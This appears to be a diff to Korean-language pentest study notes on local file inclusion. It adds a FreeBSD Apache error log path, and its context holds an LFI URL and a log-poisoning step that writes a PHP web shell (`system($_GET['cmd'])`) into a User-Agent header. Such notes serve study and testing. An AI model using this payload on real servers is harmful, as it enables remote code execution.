@@ -455,6 +455,8 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o
 
 ### User-Agent를 이용한 Log Poisoning
 
+- FreeBSD Apache Log file Location : `/var/log/httpd-error.log`
+
 ```bash
 # 1. 악성 PHP 코드를 User-Agent에 삽입
 echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
